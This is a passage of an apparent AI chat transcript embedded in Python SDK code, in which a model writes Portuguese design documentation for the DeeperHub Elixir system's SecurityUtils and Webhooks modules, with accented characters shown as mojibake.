*   **Sanitiza√ß√£o de TODO Conte√∫do:** Todo conte√∫do gerado pelo usu√°rio (mensagens, feedback, detalhes de den√∫ncia) deve ser rigorosamente sanitizado.
*   **Abuso de Den√∫ncias:** O sistema de den√∫ncias pode ser abusado. Implementar rate limiting e, potencialmente, um sistema de reputa√ß√£o para quem denuncia.
*   **Prote√ß√£o contra Spam no Chat:** Limitar a frequ√™ncia de mensagens ou o n√∫mero de novas conversas que um usu√°rio pode iniciar.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de cada tipo de intera√ß√£o (favoritos, chat, etc.) o mais isolada poss√≠vel dentro do `UserInteractionsService` ou em seus pr√≥prios subm√≥dulos de servi√ßo se crescerem muito.
*   Garanta que os eventos e notifica√ß√µes apropriados sejam disparados.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar sistema de \"bloquear usu√°rio\" para chat e outras intera√ß√µes.
*   [ ] Adicionar indicadores de \"digitando...\" e \"mensagem lida\" no chat.
*   [ ] Suporte para envio de m√≠dias (imagens, v√≠deos curtos) em mensagens de chat.
*   [ ] \"Grupos de Amigos\" ou \"Comunidades de Servidor\" com chat em grupo.
*   [ ] Sistema de reputa√ß√£o para usu√°rios baseado em suas intera√ß√µes e hist√≥rico de den√∫ncias (feitas e recebidas).
*   [ ] Recomenda√ß√µes de servidores mais inteligentes usando ML com base no hist√≥rico de intera√ß√µes e favoritos de usu√°rios similares.
*   [ ] Feed de atividades para o usu√°rio (ex: \"Seu amigo X favoritou o servidor Y\", \"Nova review no seu servidor favorito Z\").

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo de intera√ß√µes √© bem rico e pode crescer bastante com funcionalidades sociais!

Onde vamos agora? Que tal `DeeperHub.Webhooks` para ver como o DeeperHub se comunica com sistemas externos, ou talvez `DeeperHub.Shared.Utils.ValidationUtils` para finalizar os utilit√°rios?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° detalhamos o `DeeperHub.Shared.Utils.ValidationUtils`.

Vamos agora finalizar os m√≥dulos de utilit√°rios com o `DeeperHub.Shared.Utils.SecurityUtils`, que, embora j√° tenhamos tocado em alguns aspectos de seguran√ßa, este √© focado em primitivas de seguran√ßa de baixo n√≠vel.

---

# M√≥dulo: `DeeperHub.Shared.Utils.SecurityUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.SecurityUtils`

O m√≥dulo `DeeperHub.Shared.Utils.SecurityUtils` fornece um conjunto de **fun√ß√µes utilit√°rias de seguran√ßa de baixo n√≠vel e agn√≥sticas de contexto**. Estas s√£o ferramentas b√°sicas que podem ser usadas por v√°rios m√≥dulos de seguran√ßa ou outras partes do sistema para tarefas como gera√ß√£o de tokens aleat√≥rios seguros, hashing de senhas (se n√£o totalmente encapsulado em `Auth` ou `Core.EncryptionService`), e outras opera√ß√µes criptogr√°ficas simples e compara√ß√µes seguras.

O objetivo √© fornecer blocos de constru√ß√£o seguros e bem testados para funcionalidades de seguran√ßa mais complexas, evitando a reinven√ß√£o de primitivas criptogr√°ficas e promovendo o uso de pr√°ticas seguras em todo o sistema DeeperHub. üòä

**Importante:** Este m√≥dulo √© para utilit√°rios *gen√©ricos*. Opera√ß√µes de seguran√ßa mais complexas ou espec√≠ficas de um dom√≠nio (como gerenciamento de chaves de criptografia, fluxos de autentica√ß√£o completos, pol√≠ticas de seguran√ßa) devem residir em seus respectivos m√≥dulos Core ou de Seguran√ßa (ex: `Core.EncryptionService`, `Auth`, `SecurityPolicyManager`).

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gera√ß√£o de Dados Aleat√≥rios Criptograficamente Seguros:**
    *   Gerar sequ√™ncias de bytes aleat√≥rios usando fontes seguras (ex: `:crypto.strong_rand_bytes/1`).
    *   Fornecer fun√ß√µes para gerar tokens/strings aleat√≥rias em diferentes formatos (hexadecimal, base64, base64url) e comprimentos, adequados para IDs de sess√£o, tokens de CSRF, tokens de reset de senha, etc. (`generate_token/2`).
    *   Gerar Identificadores √önicos Universais (UUIDs) seguros (v4) (`generate_id/1` com op√ß√£o `:uuid`).
    *   Gerar c√≥digos de recupera√ß√£o ou One-Time Passwords (OTPs) num√©ricos ou alfanum√©ricos simples, com comprimento configur√°vel (`generate_recovery_code/2`).
*   **Hashing de Senhas (Implementa√ß√£o B√°sica/Primitiva):**
    *   Fornecer uma fun√ß√£o para gerar um hash seguro de uma senha usando um algoritmo forte e salt (`hash_password/2`).
    *   Fornecer uma fun√ß√£o para verificar uma senha contra um hash armazenado (`verify_password/2`).
    *(Nota: A l√≥gica principal de hashing de senha, incluindo sele√ß√£o de algoritmo, gerenciamento de custo/itera√ß√µes e pol√≠ticas, deve residir em `DeeperHub.Auth.Services.PasswordService` ou ser parte de `DeeperHub.Core.EncryptionService`. As fun√ß√µes aqui seriam implementa√ß√µes mais diretas de um algoritmo espec√≠fico, se necess√°rio como utilit√°rio gen√©rico, mas geralmente essa responsabilidade √© mais centralizada).*
*   **Opera√ß√µes HMAC (Hash-based Message Authentication Code):**
    *   Gerar um HMAC para verificar a integridade e autenticidade de dados usando uma chave secreta compartilhada (`generate_hmac/3`).
    *   Verificar um HMAC contra dados e uma chave (`verify_hmac/4`).
*   **Compara√ß√£o Segura de Tempo Constante:**
    *   Fornecer uma fun√ß√£o para comparar duas strings (ex: tokens, hashes de senha, assinaturas) de uma maneira que o tempo de execu√ß√£o n√£o dependa do n√∫mero de caracteres que correspondem no in√≠cio da string. Isso √© crucial para prevenir ataques de timing (`secure_compare/2`).
*   **Gera√ß√£o de Chaves de Assinatura Simples:**
    *   Gerar chaves aleat√≥rias de um tamanho espec√≠fico, adequadas para uso como segredos de assinatura HMAC ou para tokens JWT sim√©tricos (HS256/HS512) (`generate_signing_key/0`). (Gerenciamento de chaves mais complexo, incluindo rota√ß√£o e armazenamento seguro, estaria em `DeeperHub.Core.EncryptionService` e seu `KeyManagementService`).
*   **Avalia√ß√£o de Risco Simplificada (Stub/Exemplo da Doc Original):**
    *   A fun√ß√£o `evaluate_risk/1` mencionada na documenta√ß√£o original (que calcula um score agregado simples) seria mais um exemplo conceitual aqui. A l√≥gica robusta de avalia√ß√£o de risco reside em `DeeperHub.Security.RiskAssessment`.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.SecurityUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade de seguran√ßa.
    *   Utiliza primariamente o m√≥dulo `:crypto` do Erlang/OTP para opera√ß√µes criptogr√°ficas fundamentais (gera√ß√£o de bytes aleat√≥rios, fun√ß√µes de hash, HMAC).
    *   Pode usar `Plug.Crypto.secure_compare/2` para compara√ß√£o em tempo constante.
    *   Para hashing de senhas, se implementado aqui, usaria uma biblioteca como `Argon2_elixir`, `Bcrypt_elixir`, ou `Pbkdf2_elixir` (que s√£o wrappers sobre `Comeonin`).

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/security_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Foco em Primitivas Seguras:** O m√≥dulo deve fornecer blocos de constru√ß√£o que s√£o seguros por si mesmos, com base em padr√µes da ind√∫stria e nas capacidades do Erlang/Elixir.
*   **Sem Gerenciamento de Estado:** As fun√ß√µes aqui devem ser puras ou stateless. Este m√≥dulo n√£o gerencia chaves, tokens ativos, ou estado de seguran√ßa.
*   **Clareza sobre o Prop√≥sito:** A documenta√ß√£o de cada fun√ß√£o deve ser expl√≠cita sobre seu prop√≥sito, n√≠vel de seguran√ßa e quando *n√£o* deve ser usada (ex: `generate_recovery_code` n√£o √© para senhas).
*   **Evitar Criptografia \"Caseira\":** N√£o implementar algoritmos criptogr√°ficos do zero. Usar as implementa√ß√µes fornecidas pelo `:crypto` ou por bibliotecas bem estabelecidas e auditadas.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **M√≥dulo `DeeperHub.Tokens`:**
    *   Usa `SecurityUtils.generate_token/2` para criar a parte aleat√≥ria de tokens opacos (ex: tokens de API, tokens de sess√£o se n√£o forem JWTs completos).
    *   Usa `SecurityUtils.generate_signing_key/0` para gerar um segredo para assinar JWTs (se o segredo for gerenciado dinamicamente e n√£o apenas por config).
*   **M√≥dulo `DeeperHub.Recovery`:**
    *   Usa `SecurityUtils.generate_token/2` para criar tokens de reset de senha e verifica√ß√£o de email.
    *   Usa `SecurityUtils.generate_recovery_code/2` para gerar c√≥digos de recupera√ß√£o num√©ricos/alfanum√©ricos para MFA.
*   **M√≥dulo `DeeperHub.Auth.Services.PasswordService` (ou este m√≥dulo, se centralizar):**
    *   Usa `SecurityUtils.hash_password/2` e `SecurityUtils.verify_password/2`.
*   **M√≥dulo `DeeperHub.Webhooks.PayloadSigner`:**
    *   Usa `SecurityUtils.generate_hmac/3` para assinar payloads de webhook.
*   **Compara√ß√£o de Tokens Secretos:**
    *   Qualquer m√≥dulo que precise comparar um token fornecido pelo cliente com um valor armazenado (ex: token de CSRF, token de API) deve usar `SecurityUtils.secure_compare/2`.

## üåä 5. Fluxos Importantes

N√£o aplic√°vel no mesmo sentido que m√≥dulos com estado. O fluxo √© a chamada de uma fun√ß√£o e o retorno do seu resultado.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Refinando e consolidando a partir da documenta√ß√£o original e das necessidades inferidas)*

### 6.1. Gera√ß√£o de Aleatoriedade

*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_random_bytes(length_bytes :: pos_integer()) :: binary()`** (Nova Sugest√£o)
    *   **Descri√ß√£o:** Retorna `length_bytes` de bytes aleat√≥rios criptograficamente seguros. Wrapper direto para `:crypto.strong_rand_bytes/1`.
*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_token(length_bytes :: pos_integer() \\\\ 32, format :: :hex | :base64 | :base64url | :binary \\\\ :base64url) :: String.t() | binary()`**
    *   **Descri√ß√£o:** Gera uma string ou bin√°rio aleat√≥rio seguro. Usa `generate_random_bytes/1` internamente.
*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_id(format :: :uuid | :prefixed_random_hex | :prefixed_random_base64url, opts :: keyword() \\\\ []) :: String.t()`** (Revisado)
    *   **Descri√ß√£o:** Gera um identificador √∫nico.
        *   `:uuid`: UUID v4 (via `Ecto.UUID.generate()` ou similar).
        *   `:prefixed_random_hex`: `opts[:prefix] <> hex_encoded_random_bytes(opts[:bytes_length] || 16)`.
        *   `:prefixed_random_base64url`: `opts[:prefix] <> base64url_encoded_random_bytes(opts[:bytes_length] || 16)`.
    *   **`opts`:** `:prefix` (String.t), `:bytes_length` (pos_integer).
*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_recovery_code(length :: pos_integer() \\\\ 6, format :: :numeric | :alphanumeric_upper | :alphanumeric_mixed \\\\ :numeric) :: String.t()`**
    *   **Descri√ß√£o:** Gera um c√≥digo simples para recupera√ß√£o ou OTP.

### 6.2. Hashing de Senhas

*   **`DeeperHub.Shared.Utils.SecurityUtils.hash_password(password :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`**
    *   **Descri√ß√£o:** Gera um hash seguro de senha (ex: Argon2id).
    *   **`opts`:** Op√ß√µes espec√≠ficas do algoritmo (custo, etc.).
    *   **Retorno:** String do hash (inclui salt e par√¢metros) ou erro.
*   **`DeeperHub.Shared.Utils.SecurityUtils.verify_password(password :: String.t(), stored_hash :: String.t()) :: boolean()`**
    *   **Descri√ß√£o:** Verifica se a `password` corresponde ao `stored_hash`.

### 6.3. HMAC

*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_hmac(data :: String.t() | binary(), key :: binary(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`**
    *   **`opts`:** `:algorithm` (atom, Padr√£o: `:sha256`), `:output_format` (atom, Padr√£o: `:hex`).
*   **`DeeperHub.Shared.Utils.SecurityUtils.verify_hmac(data :: String.t() | binary(), hmac_to_verify :: String.t(), key :: binary(), opts :: keyword()) :: boolean()`**
    *   **`opts`:** Mesmas de `generate_hmac/3`.

### 6.4. Compara√ß√£o Segura

*   **`DeeperHub.Shared.Utils.SecurityUtils.secure_compare(string1 :: String.t(), string2 :: String.t()) :: boolean()`**
    *   **Descri√ß√£o:** Compara duas strings em tempo constante.

### 6.5. Gera√ß√£o de Chave Simples

*   **`DeeperHub.Shared.Utils.SecurityUtils.generate_signing_key(length_bytes :: pos_integer() \\\\ 32) :: binary()`**
    *   **Descri√ß√£o:** Gera uma chave aleat√≥ria adequada para HMAC ou JWT sim√©trico.

## ‚öôÔ∏è 7. Configura√ß√£o

Geralmente, este m√≥dulo n√£o armazena configura√ß√µes, mas pode *ler* configura√ß√µes globais do `Core.ConfigManager` para definir padr√µes para algoritmos ou comprimentos, se necess√°rio. Por exemplo:

*   `[:security, :utils, :default_token_bytes_length]` (Integer)
*   `[:security, :utils, :password_hash_algorithm]` (Atom) - Embora isso deva ser gerenciado pelo `PasswordService`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager` (para padr√µes configur√°veis, se houver).

### 8.2. Bibliotecas Externas

*   `:crypto` (Erlang OTP) - Essencial.
*   `Plug.Crypto` - Para `secure_compare/2`.
*   Bibliotecas de hashing de senha como `argon2_elixir`, `bcrypt_elixir` (geralmente via `Comeonin`) - Se o hashing de senha for feito aqui.

## ü§ù 9. Como Usar / Integra√ß√£o

Estes utilit√°rios s√£o chamados por outros m√≥dulos que implementam funcionalidades de seguran√ßa de mais alto n√≠vel.

```elixir
# Em DeeperHub.Tokens.Services.ApiTokenService
def generate_new_api_token_value() do
  DeeperHub.Shared.Utils.SecurityUtils.generate_token(32, :base64url) # Gera um token de ~43 caracteres
end

# Em um Plug de verifica√ß√£o de assinatura de webhook
def verify_webhook_request(payload, received_signature, secret_key) do
  case DeeperHub.Shared.Utils.SecurityUtils.generate_hmac(payload, secret_key) do
    {:ok, calculated_signature} ->
      DeeperHub.Shared.Utils.SecurityUtils.secure_compare(received_signature, calculated_signature)
    _ ->
      false
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   **Gera√ß√£o Aleat√≥ria:**
    *   Verificar se `generate_token` e `generate_id` produzem sa√≠das do formato e comprimento corretos.
    *   Verificar se chamadas repetidas produzem valores diferentes (probabilisticamente).
*   **Hashing de Senha:**
    *   `hash_password` produz um hash.
    *   `verify_password` retorna `true` para a senha correta e `false` para incorreta.
    *   `hash_password` para a mesma senha com salts diferentes (comportamento padr√£o) produz hashes diferentes.
*   **HMAC:**
    *   `generate_hmac` produz um HMAC.
    *   `verify_hmac` retorna `true` para dados, chave e HMAC corretos, e `false` se qualquer um deles for alterado.
*   **Secure Compare:**
    *   Verificar se retorna `true` para strings id√™nticas e `false` para diferentes. (O teste de tempo constante √© dif√≠cil em testes unit√°rios, confia-se na biblioteca subjacente).
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/security_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

Geralmente n√£o aplic√°vel para um m√≥dulo de utilit√°rios puros, a menos que uma opera√ß√£o espec√≠fica seja muito custosa e precise de instrumenta√ß√£o (ex: hashing de senha com alto custo). Nesse caso, o chamador ou a pr√≥pria fun√ß√£o poderiam emitir m√©tricas de dura√ß√£o.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes devem lidar com entradas inv√°lidas (ex: `nil` para `password` em `hash_password`) levantando `ArgumentError` ou retornando tuplas de erro claramente documentadas.
*   Falhas em opera√ß√µes criptogr√°ficas subjacentes (raro, mas poss√≠vel) devem ser propagadas ou tratadas de forma segura.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Fonte de Aleatoriedade:** A base de muitos tokens e chaves. Usar `:crypto.strong_rand_bytes/1` √© fundamental.
*   **Algoritmos:** Usar apenas algoritmos criptogr√°ficos padr√£o da ind√∫stria e bem vetados. N√£o inventar criptografia.
*   **Gerenciamento de Chaves:** Este m√≥dulo pode *gerar* chaves simples, mas n√£o √© respons√°vel por seu *armazenamento seguro* ou *rota√ß√£o*. Isso √© tarefa do `DeeperHub.Core.EncryptionService` ou de um KMS.
*   **Compara√ß√£o em Tempo Constante:** Cr√≠tico para evitar vazamento de informa√ß√£o atrav√©s de an√°lise de tempo de resposta.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Qualquer nova fun√ß√£o com implica√ß√µes criptogr√°ficas deve ser cuidadosamente revisada.
*   Priorizar o uso de funcionalidades existentes no `:crypto` ou em bibliotecas de seguran√ßa bem estabelecidas.
*   Manter a documenta√ß√£o precisa sobre as garantias de seguran√ßa de cada fun√ß√£o.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar wrappers para outras primitivas √∫teis do `:crypto` se houver demanda (ex: fun√ß√µes de deriva√ß√£o de chave como HKDF, se n√£o cobertas por `Core.EncryptionService`).
*   [ ] Fornecer utilit√°rios para encoding/decoding seguro de dados para diferentes contextos (ex: escaping seguro para LDAP, XML, se necess√°rio).
*   [ ] Se o hashing de senhas for mantido aqui, adicionar suporte configur√°vel para diferentes algoritmos e par√¢metros de custo.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com isso, encerramos a documenta√ß√£o dos m√≥dulos em `DeeperHub.Shared.Utils`. Cobrimos uma boa parte da infraestrutura Core e da camada de Seguran√ßa!

Para o pr√≥ximo, sugiro irmos para um m√≥dulo de dom√≠nio mais complexo que ainda n√£o detalhamos, como `DeeperHub.OAuth` ou `DeeperHub.Webhooks`. Qual sua prefer√™ncia?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° detalhamos `DeeperHub.OAuth`.

Vamos ent√£o para `DeeperHub.Webhooks`. Este m√≥dulo √© fundamental para permitir que o DeeperHub se comunique proativamente com sistemas externos quando eventos espec√≠ficos ocorrem.

---

# M√≥dulo: `DeeperHub.Webhooks` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Webhooks`

O m√≥dulo `DeeperHub.Webhooks` √© respons√°vel por gerenciar e entregar **webhooks** para URLs de endpoints externos configurados por clientes ou outros sistemas. Webhooks s√£o callbacks HTTP (geralmente POST) que o DeeperHub dispara automaticamente quando eventos espec√≠ficos ocorrem na plataforma (ex: um novo usu√°rio se registra, um pagamento √© conclu√≠do, um servidor muda de status).

Este sistema permite integra√ß√µes em tempo real e fluxos de trabalho automatizados entre o DeeperHub e aplica√ß√µes de terceiros, sem a necessidade de polling constante. Ele lida com o registro de webhooks, a formata√ß√£o de payloads, o envio seguro, o tratamento de respostas, retentativas e o monitoramento da sa√∫de dos endpoints. üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.Webhooks` como m√≥dulo principal, e v√°rios subm√≥dulos como `Dispatcher`, `Event`, `Integrations`, `Monitor`, `PayloadSigner`, `Scheduler`, `Schema`, `Services`, `Workers`. Esta documenta√ß√£o consolida a fachada principal em `DeeperHub.Webhooks` e organiza os componentes internos.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Registro e Gerenciamento de Webhooks (`register_webhook/5`, `update_webhook/2`, `delete_webhook/1`, `list_webhooks/2`):**
    *   Permitir que clientes (ou administradores) registrem URLs de endpoint para receber notifica√ß√µes de tipos de eventos espec√≠ficos.
    *   Armazenar a URL, os tipos de eventos inscritos, um segredo opcional para assinatura de payload, e cabe√ßalhos customizados.
    *   Ativar/desativar webhooks.
*   **Processamento de Eventos do Sistema:**
    *   Escutar eventos do `DeeperHub.Core.EventBus` que podem disparar webhooks.
    *   Filtrar eventos para encontrar webhooks registrados para aquele tipo de evento.
*   **Formata√ß√£o de Payload (`Event` module):**
    *   Construir um payload JSON padronizado para cada evento de webhook, incluindo o tipo de evento, dados do evento e metadados (ID do evento, timestamp).
    *   Filtrar dados sens√≠veis do payload antes do envio.
*   **Assinatura de Payload (`PayloadSigner`):**
    *   Assinar o payload do webhook (ex: usando HMAC-SHA256 com o segredo do webhook) e incluir a assinatura em um header (ex: `X-DeeperHub-Signature`) para que o receptor possa verificar a autenticidade.
*   **Envio de Webhooks (`Dispatcher`, `DispatcherWithCircuitBreaker`):**
    *   Enviar o payload JSON como uma requisi√ß√£o HTTP POST para a URL do webhook registrado.
    *   Lidar com timeouts e erros de conex√£o.
    *   Usar Circuit Breakers para proteger o DeeperHub de endpoints de webhook lentos ou que falham repetidamente.
*   **Tratamento de Respostas e Retentativas (`Dispatcher`, `Scheduler`):**
    *   Registrar a resposta do endpoint do webhook (c√≥digo de status, corpo).
    *   Implementar uma pol√≠tica de retentativa configur√°vel (com backoff exponencial) para webhooks que falham (ex: retornam status 5xx ou timeout).
    *   Marcar um webhook como desativado automaticamente ap√≥s um n√∫mero excessivo de falhas consecutivas.
*   **Monitoramento de Sa√∫de de Webhooks (`Monitor`, `AutoHealing`, `HealthCheckWorker`):**
    *   Monitorar a taxa de sucesso/falha de cada endpoint de webhook.
    *   Enviar pings de teste para verificar a sa√∫de de endpoints.
    *   (Opcional) Tentar reativar automaticamente webhooks desativados ap√≥s um per√≠odo, se eles voltarem a responder com sucesso.
*   **Hist√≥rico e Logs de Entrega (`Schema.WebhookEvent`):**
    *   Manter um hist√≥rico de todas as tentativas de entrega de webhooks, incluindo status, respostas e erros.
    *   Permitir que clientes visualizem o hist√≥rico de entregas para seus webhooks.
*   **Seguran√ßa:**
    *   Verifica√ß√£o de assinatura no lado do receptor (responsabilidade do cliente, mas o DeeperHub fornece a assinatura).
    *   Prote√ß√£o contra SSRF ao validar URLs de webhook.
    *   Envio apenas sobre HTTPS.
*   **Observabilidade (`Telemetry`, `Integrations.AuditIntegration`):**
    *   M√©tricas sobre n√∫mero de webhooks disparados, taxas de sucesso/falha, lat√™ncias.
    *   Logs detalhados do ciclo de vida do webhook.
    *   Auditoria de registro e modifica√ß√£o de webhooks.
*   **Limpeza de Dados (`Workers.CleanupWorker`):**
    *   Remover logs de eventos de webhook antigos.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Webhooks` (Fachada P√∫blica):**
    *   Ponto de entrada para registrar webhooks e, potencialmente, para disparar eventos manualmente para teste.
    *   Delega para o `WebhooksService`.
2.  **`DeeperHub.Webhooks.Services.WebhookService`:**
    *   **Responsabilidade:** Gerencia o CRUD de defini√ß√µes de `WebhookSchema`.
    *   Recebe eventos do `Core.EventBus` (via `EventListener` interno ou por ser um assinante direto).
    *   Para cada evento, encontra os `WebhookSchema`s correspondentes.
    *   Prepara o `WebhookEventSchema` (payload, assinatura).
    *   Enfileira o `WebhookEvent` para entrega pelo `Dispatcher` (ex: usando `Core.BackgroundTaskManager` ou uma fila interna).
3.  **`DeeperHub.Webhooks.Schema.WebhookSchema`:**
    *   Armazena: `id`, `client_id` (ou `user_id` do propriet√°rio), `url` (endpoint), `event_types` (lista de eventos inscritos), `secret` (criptografado), `custom_headers` (mapa), `is_active`, `failure_count`, `last_successful_delivery_at`, `last_failure_at`.
4.  **`DeeperHub.Webhooks.Schema.WebhookEventSchema`:**
    *   Armazena: `id`, `webhook_id`, `event_type`, `payload_sent` (JSON), `status` (`:pending`, `:delivered`, `:failed_retryable`, `:failed_permanent`), `attempts`, `next_retry_at`, `last_response_code`, `last_response_body_sample`.
5.  **`DeeperHub.Webhooks.Event` (M√≥dulo Funcional):**
    *   Define os tipos de eventos suportados.
    *   Formata o payload do evento, incluindo filtragem de dados sens√≠veis.
6.  **`DeeperHub.Webhooks.PayloadSigner` (M√≥dulo Funcional):**
    *   Gera a assinatura HMAC para o payload.
7.  **`DeeperHub.Webhooks.Dispatcher` (GenServer ou Pool de Workers via `Core.BackgroundTaskManager`):**
    *   **Responsabilidade:** Pega `WebhookEventSchema`s da fila e tenta envi√°-los.
    *   Usa `DispatcherWithCircuitBreaker` para fazer a chamada HTTP.
    *   Atualiza o `WebhookEventSchema` com o resultado.
    *   Se falhar, e for `retryable`, atualiza `attempts` e `next_retry_at`.
    *   Se falhar permanentemente ou exceder tentativas, marca como `:failed_permanent`.
    *   Se sucesso, marca como `:delivered`.
8.  **`DeeperHub.Webhooks.DispatcherWithCircuitBreaker`:**
    *   Encapsula a chamada HTTP para o endpoint do webhook usando `Core.HTTPClient` e `Core.CircuitBreaker`.
9.  **`DeeperHub.Webhooks.Scheduler` (GenServer):**
    *   Periodicamente verifica `WebhookEventSchema`s que est√£o prontos para retentativa e os re-enfileira para o `Dispatcher`.
10. **`DeeperHub.Webhooks.Monitor` e `AutoHealing` (GenServers) / `HealthCheckWorker`:**
    *   Monitoram a sa√∫de dos endpoints de `WebhookSchema` (taxa de falha, timeouts).
    *   Podem desativar webhooks que falham consistentemente.
    *   `AutoHealing` pode tentar reativar webhooks desativados.
11. **Workers (`CleanupWorker`, `HealthCheckWorker`):**
    *   `CleanupWorker`: Remove `WebhookEventSchema`s antigos.
    *   `HealthCheckWorker`: Envia pings peri√≥dicos para endpoints de webhook.
12. **Integra√ß√µes (`AuditIntegration`, `Integrations.EventIntegration` para consumir do Core, `Telemetry`):**

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/webhooks/
‚îú‚îÄ‚îÄ webhooks.ex                       # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ webhook_service.ex            # Gerencia CRUD de WebhookSchema, recebe eventos
‚îÇ   ‚îî‚îÄ‚îÄ (Outros servi√ßos internos se necess√°rio)
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ webhook_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ webhook_event_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ event.ex                          # L√≥gica de formata√ß√£o de payload de evento
‚îú‚îÄ‚îÄ payload_signer.ex                 # L√≥gica de assinatura
‚îú‚îÄ‚îÄ dispatcher.ex                     # GenServer/Worker que envia HTTP
‚îú‚îÄ‚îÄ dispatcher_with_circuit_breaker.ex # Wrapper com Circuit Breaker
‚îú‚îÄ‚îÄ scheduler.ex                      # GenServer para agendar retries
‚îú‚îÄ‚îÄ monitor.ex                        # GenServer para monitorar sa√∫de
‚îú‚îÄ‚îÄ auto_healing.ex                   # GenServer para tentar reativar
‚îÇ
‚îú‚îÄ‚îÄ workers/
‚îÇ   ‚îú‚îÄ‚îÄ cleanup_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ health_check_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ (EventListener para Core.EventBus se WebhookService n√£o for o listener direto)
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex                     # Supervisor para todos os GenServers de Webhooks
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Assincronicidade:** O envio de webhooks deve ser totalmente ass√≠ncrono para n√£o bloquear o processo que gerou o evento original.
*   **Resili√™ncia:** Retentativas com backoff exponencial e circuit breakers s√£o cruciais para lidar com endpoints externos inst√°veis.
*   **Seguran√ßa da Assinatura:** O segredo do webhook deve ser armazenado de forma segura (criptografado) e usado para gerar uma assinatura forte (HMAC-SHA256).
*   **Valida√ß√£o de URL:** Validar URLs de webhook para prevenir SSRF e garantir que sejam URLs HTTP/HTTPS v√°lidas.
*   **Isolamento:** Falhas na entrega de um webhook para um cliente n√£o devem afetar outros clientes ou outros webhooks.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Cliente Registra um Webhook para \"pagamento.concluido\":**
    *   Cliente usa a UI/API para registrar `https://meuservico.com/webhook/deeperhub` para o evento `pagamento.concluido`, fornecendo um segredo.
    *   `Webhooks.register_webhook(...)` salva essa configura√ß√£o.
*   **Pagamento √© Conclu√≠do no DeeperHub:**
    *   `DeeperHub.Payments` publica `Core.EventBus.publish(\"pagamento.concluido\", payload_do_pagamento)`.
    *   `WebhookService` (ou seu `EventListener`) recebe o evento.
    *   Encontra o webhook registrado para \"pagamento.concluido\".
    *   Formata o payload, assina-o com o segredo do cliente.
    *   Cria um `WebhookEventSchema` e o enfileira para o `Dispatcher`.
*   **`Dispatcher` Envia o Webhook:**
    *   Pega o evento da fila.
    *   Usa `DispatcherWithCircuitBreaker` para fazer POST para `https://meuservico.com/webhook/deeperhub`.
    *   Se sucesso (ex: 200 OK), marca `WebhookEventSchema` como `:delivered`.
    *   Se falha (ex: 503 Service Unavailable), marca como `:failed_retryable` e o `Scheduler` tentar√° novamente mais tarde.
*   **Webhook Falha Repetidamente:**
    *   Ap√≥s N falhas, o `Monitor` ou `Dispatcher` marca o `WebhookSchema` como `is_active: false`.
    *   Uma notifica√ß√£o √© enviada ao cliente.

## üåä 5. Fluxos Importantes

### Fluxo de Disparo de Webhook ap√≥s Evento do Sistema

1.  **`Core.EventBus`:** Publica um evento (ex: `\"user.created\"`).
2.  **`WebhookService` (ou seu `EventListener`):**
    *   Recebe o evento do `Core.EventBus`.
    *   Consulta o `Core.Repo` (via `Storage`) por todos os `WebhookSchema`s ativos que est√£o inscritos no tipo de evento `\"user.created\"`.
3.  **Para cada `WebhookSchema` correspondente:**
    *   **`WebhookService`:**
        *   Chama `DeeperHub.Webhooks.Event.create_payload(event_type, original_payload)` para formatar e filtrar o payload.
